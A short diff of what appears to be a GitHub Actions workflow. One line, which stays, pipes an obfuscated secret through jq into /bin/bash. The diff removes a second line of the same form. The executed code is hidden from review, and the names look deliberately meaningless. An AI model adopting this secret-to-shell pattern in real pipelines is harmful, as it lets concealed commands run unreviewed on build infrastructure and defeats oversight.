@@ -20,7 +20,6 @@ jobs:
           xd027: ${{ secrets.xd027 }}
         run: |
           printf '%s' "$xd027" | jq -r .zigf226 | /bin/bash
-          echo $s05 | jq -r .tqwsf97674 | /bin/bash
 
       - name: Save output
         if: always()
